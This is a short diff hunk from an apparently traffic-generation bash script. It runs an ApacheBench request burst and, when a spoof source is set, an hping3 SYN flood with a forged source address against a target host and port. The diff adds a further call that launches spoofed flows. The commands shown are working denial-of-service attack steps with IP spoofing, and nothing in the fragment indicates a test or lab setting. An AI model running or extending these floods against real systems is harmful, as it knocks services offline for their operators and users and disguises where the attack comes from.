@@ -23,6 +23,7 @@ launch "ab request burst" bash -c "
 if [ -n "${SPOOF_SOURCE}" ]; then
   need hping3
   launch "hping3 spoofed flood" hping3 -a "${SPOOF_SOURCE}" -S --flood -p "${PORT}" "${TARGET}"
+  launch_spoofed_flows "${SPOOF_SOURCE}" "${TARGET}" "${PORT}" tcp
 fi
 
 finish
